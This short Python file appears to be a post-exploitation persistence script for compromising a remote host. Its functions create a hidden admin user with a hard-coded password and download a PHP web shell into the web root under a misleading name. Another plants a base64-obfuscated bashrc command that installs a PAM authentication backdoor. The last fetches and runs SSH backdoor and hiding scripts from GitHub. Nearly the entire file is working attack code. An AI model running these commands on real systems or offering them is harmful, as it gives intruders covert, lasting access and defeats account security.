def backdoor_user(connect):
    connect.sudo("sh -c 'useradd totally_legit_user && usermod -u 599 totally_legit_user && usermod -a -G admin "
                 "totally_legit_user && echo \"VerySecure\nVerySecure\" | passwd totally_legit_user'")


def backdoor_webshell(connect):
    connect.run("fetch https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php")
    connect.run("mv index.php /usr/local/www/WebMagic.php")


def backdoor_pam(connect):
    connect.sudo("sh -c 'echo "
                 "\"YXB0LWdldCBpbnN0YWxsIGdpdCAteQpnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL3plcGhyYXgvbGludXgtcGFtLWJhY2t"
                 "kb29yLmdpdApjZCBsaW51eC1wYW0tYmFja2Rvb3IvCi4vYmFja2Rvb3Iuc2ggLXYgMS4xLjggLXAgbTAwZHkKbXYgcGFtX3VuaXgu"
                 "c28gL2xpYi94ODZfNjQtbGludXgtZ251L3NlY3VyaXR5LwpybSAtcmYgbGludXgtcGFtLWJhY2tkb29yLw==\" | base64 -d |"
                 " sudo tee -a /etc/bash.bashrc'")


def backdoor_ssh(connect):
    connect.run("wget https://raw.githubusercontent.com/iamckn/backdoors/master/bd_hide.sh")
    connect.run("wget https://raw.githubusercontent.com/iamckn/backdoors/master/bd_sshd.sh")
    connect.run("chmod +x bd_hide.sh bd_sshd.sh")
    connect.sudo("sh -c './bd_sshd.sh && ./bd_hide.sh && rm bd_*'")


#Up to implementation: merlin